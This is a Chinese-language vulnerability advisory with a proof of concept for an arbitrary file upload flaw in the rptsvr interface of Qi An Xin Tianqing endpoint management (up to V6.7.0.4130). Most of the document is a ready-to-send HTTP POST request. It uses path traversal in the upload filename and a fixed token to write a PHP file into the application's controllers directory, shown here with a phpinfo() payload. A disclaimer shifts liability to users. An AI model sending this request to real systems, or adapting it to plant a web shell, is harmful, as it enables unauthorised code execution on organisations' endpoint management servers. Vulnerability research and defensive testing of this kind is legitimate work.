# 奇安信天擎rptsvr任意文件上传漏洞

>奇安信天擎终端安全管理系统是注重实效的一体化终端安全解决方案，通过“体系化防御、数字化运营”方法，帮助政企客户准确识别、保护和监管终端，并确保这些终端在任何时候都能可信、安全、合规地访问数据和业务。

## 漏洞描述

奇安信天擎管理中心在V6.7.0.4130及之前版本的rptsvr接口存在任意文件上传漏洞，攻击者可上传恶意文件至服务器，执行脚本文件。

## 漏洞类型

任意文件上传

## 漏洞影响

-   奇安信天擎管理中心 <= V6.7.0.4130

## POC

```http
POST /rptsvr/upload HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
Connection: close
Content-Length: 414
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
Upgrade-Insecure-Requests: 1

-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/TController2.php"
Content-Type: text/x-python

<?php
phpinfo();
?>
-----------------------------55433477442814818502792421460
Content-Disposition: form-data; name="token"

skylar_report
-----------------------------55433477442814818502792421460
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
